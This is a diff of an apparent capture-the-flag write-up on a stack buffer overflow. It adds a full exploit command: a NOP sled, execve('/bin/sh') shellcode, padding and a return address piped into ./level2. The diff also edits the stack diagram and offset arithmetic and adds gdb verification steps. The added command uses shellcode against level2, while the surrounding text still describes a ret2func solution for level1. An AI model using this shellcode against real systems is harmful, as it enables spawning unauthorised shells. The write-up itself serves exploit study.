@@ -1,4 +1,4 @@
-Level1 - Buffer Overflow - ret2func
+command: (python -c 'print "\x90"*40 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*19 + "\xcf\x84\x04\x08"'; cat) | ./level2
 
 === Analysis ===
 
@@ -25,23 +25,40 @@ High addresses
 ├─────────────────────┤
 │ saved EBP           │  4 bytes
 ├─────────────────────┤
-│ 8 bytes (padding)   │  ← between buffer and EBP (mostly for alignement of the stack 'compiler')
+│ 8 bytes (padding)   │  ← The compiler needed the total frame to be 88 bytes for alignment. (ebp - esp to calculate)
 ├─────────────────────┤
 │                     │
-|   buffer (64 bytes) │
+|  buffer (64 bytes)  │
 │                     │
 ├─────────────────────┤
 │ 16 bytes (padding)  │  ← below buffer offset padding;
 └─────────────────────┘
-Low addresses  ← esp points here, stack grows this way
+Low addresses  ← esp points here, stack grows this way (top of the stack)  
 
+-------------------------------------------------------------
+ps : ESP = 0xbffff6d0 points to the top of the stack        |
+That address is low compared to the data above it           |
+“Top” does NOT mean “highest address”                       |
+                                                            |
+-> Stack growth (allocation)                                |
+                                                            |
+This happens when the program reserves space for locals:    |
+Stack grows downward → allocation phase                     |
+Buffer writes go upward → data writing phase                |
+                                                            |
+They are independent directions                             |
+                                                            |
+New buffer space is created below                           |
+EBP and return address don’t move                           |
+They stay at higher addresses                               |
+-------------------------------------------------------------
 
 === Exploit Calculation ===
 
 To reach return address:
 - 72 bytes → fill buffer and space up to EBP
 -  4 bytes → overwrite saved EBP
-= 76 bytes of padding before return address
+= 76 bytes before return address
 
 === Address ===
 
@@ -68,3 +85,32 @@ Program jumps to run() → calls system("/bin/sh")
 Shellcode injection is also a valid solution here
 since NX is disabled for this binary.
 ret2func was chosen for simplicity.
+
+
+
+
+
+=================================== steps to verify calculation ================================
+
+Step 1 — set breakpoint BEFORE running:
+bash(gdb) break main
+You should see:
+Breakpoint 1 at 0x08048483
+
+Step 2 — now run:
+bash(gdb) run
+Program will STOP at main — you'll see:
+Breakpoint 1, 0x08048483 in main ()
+
+step3: 
+ni
+ni
+ni
+ni
+ni (reach gets function) -> fill with some content
+
+Step 4 — now check registers:
+bash(gdb) info registers esp ebp
+
+Step 4 — view stack memory:
+bash(gdb) x/80x $esp
